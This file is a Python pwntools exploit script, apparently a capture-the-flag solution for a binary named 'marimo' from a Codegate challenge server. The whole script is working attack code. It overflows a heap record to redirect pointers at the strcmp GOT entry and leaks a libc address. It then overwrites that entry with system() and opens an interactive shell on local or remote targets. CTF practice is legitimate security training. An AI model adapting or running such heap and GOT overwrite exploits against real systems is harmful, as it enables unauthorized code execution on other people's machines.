from pwn import *
import sys
from time import time, sleep

LOCAL_LIBC32 = "/lib/i386-linux-gnu/libc.so.6"
LOCAL_LIBC64 = "/lib/x86_64-linux-gnu/libc.so.6"

BINARY = "./marimo"
LIBC = "./libc.so.6"
LOCAL_LIBC = LOCAL_LIBC64

context.clear()
context(os="linux", arch="amd64", bits=64)

# def recvsend(conn, data):
#     conn.recvline()
#     conn.sendline(data)

def recvmenu(conn):
    conn.recvuntil(">> ")

def show(conn, name, prof):
    recvmenu(conn)
    conn.sendline("show me the marimo")
    conn.recvline()
    conn.sendline(name)
    conn.recvuntil(">> ")
    conn.sendline(prof)

def view(conn, idx):
    recvmenu(conn)
    conn.sendline("V")
    conn.recvuntil(">> ")
    conn.sendline(str(idx))
    conn.recvline()
    conn.recvuntil(" : ")
    birth = conn.recvline()[:-1]
    conn.recvuntil(" : ")
    currtime = conn.recvline()[:-1]
    conn.recvuntil(" : ")
    size = conn.recvline()[:-1]
    conn.recvuntil(" : ")
    price = conn.recvline()[:-1]
    conn.recvuntil(" : ")
    name = conn.recvline()[:-1]
    conn.recvuntil(" : ")
    profile = conn.recvline()[:-1]
    return (birth, currtime, size, price, name, profile)

def modify(conn, prof):
    recvmenu(conn)
    conn.sendline("M")
    conn.recvuntil(">> ")
    conn.sendline(prof)

def exploit(conn, elf, libc, local):
    show(conn, "A"*16, "A"*32)
    show(conn, "B"*16, "B"*32)

    sleep(2)
    view(conn, 0)
    payload = ""
    payload += "A" * 0x28
    payload += p64(0x20)
    payload += p32(0x4141)
    payload += p32(0x30)
    payload += p64(0x603040) # elf got strcmp
    payload += p64(0x603040) # elf got strcmp
    modify(conn, payload)
    recvmenu(conn)
    conn.sendline("B")

    _, _, _, _, leak, _ = view(conn, 1)
    libc.address = u64(leak.ljust(8, "\x00")) - 0x9f570
    log.info("%#x", libc.address)
    recvmenu(conn)
    conn.sendline("B")

    view(conn, 1)
    modify(conn, p64(libc.symbols['system'])[:-1])
    recvmenu(conn)
    conn.sendline("B")
    conn.interactive()
    return

if __name__ == "__main__":
    elf = ELF(BINARY)
    try:
        if sys.argv[1] == "remote":
            H,P = ("ch41l3ng3s.codegate.kr", 3333)
            r = remote(H, P)
            libc = ELF(LIBC) if LIBC else None
            exploit(r, elf, libc, local=False)
        elif sys.argv[1] == "local":
            r = process(BINARY)
            log.info("PID: {}".format(r.proc.pid))
            libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        elif sys.argv[1] == "docker":
            r = process(BINARY, env = {"LD_PRELOAD": LIBC})
            libc = ELF(LIBC) if LIBC else None
            pause()
            exploit(r, elf, libc, local=True)
        else:
            print "Usage: {} local|docker|remote".format(sys.argv[0])
            sys.exit(1)
    except IndexError:
        r = process(BINARY)
        log.info("PID: {}".format(r.proc.pid))
        libc = ELF(LOCAL_LIBC) if LOCAL_LIBC else None
        pause()
        exploit(r, elf, libc, local=True)
